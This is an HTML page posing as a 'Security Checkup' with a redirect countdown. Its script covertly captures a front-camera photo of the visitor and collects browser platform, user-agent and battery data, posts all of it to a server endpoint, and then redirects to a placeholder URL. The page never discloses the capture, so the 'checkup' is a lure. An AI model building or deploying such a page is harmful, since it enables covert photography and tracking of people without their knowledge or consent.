<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Checkup</title>
    <style>
        body {
            text-align: center;
            font-family: Arial, sans-serif;
            padding-top: 50px;
        }
        #camera {
            display: none;
        }
        .button {
            padding: 10px 20px;
            background-color: #f44336;
            color: white;
            border: none;
            cursor: pointer;
            font-size: 16px;
        }
    </style>
</head>
<body>
    <h1>Security Checkup</h1>
    <p>Redirecting in <span id="redirect-countdown">10</span> seconds...</p>

    <!-- Camera -->
    <video id="camera" width="320" height="240" autoplay></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        let countdown = 10;
        const countdownDisplay = document.getElementById('redirect-countdown');
        const camera = document.getElementById('camera');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        // Start countdown
        const countdownInterval = setInterval(() => {
            countdown -= 1;
            countdownDisplay.innerText = countdown;
            if (countdown <= 0) {
                clearInterval(countdownInterval);
                captureAndSendData();
            }
        }, 1000);

        // Start camera
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
            .then(stream => {
                camera.srcObject = stream;
                camera.style.display = 'block';
            })
            .catch(error => {
                alert('Camera access denied or error occurred.');
                console.error(error);
            });

        // Capture image and send data to server
        function captureAndSendData() {
            // Set canvas size to match video size
            canvas.width = camera.videoWidth;
            canvas.height = camera.videoHeight;

            // Capture image from the camera
            context.drawImage(camera, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/png').split(',')[1]; // Base64 image data

            // Collect device information
            const deviceInfo = {
                deviceType: navigator.platform,
                deviceModel: navigator.userAgent,
                ipAddress: '', // You can obtain IP address from server-side if needed
                networkCarrier: '', // Optional: Not easily accessible from frontend
                charge: navigator.getBattery ? navigator.getBattery().then(battery => battery.level) : 'N/A'
            };

            // Send data to the server
            fetch('/submit_data', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    device_info: deviceInfo,
                    image_data: imageData
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Data submitted:', data);
                window.location.href = 'https://your-next-page-url.com';  // Redirect after submission
            })
            .catch(error => {
                console.error('Error:', error);
            });
        }
    </script>
</body>
</html>
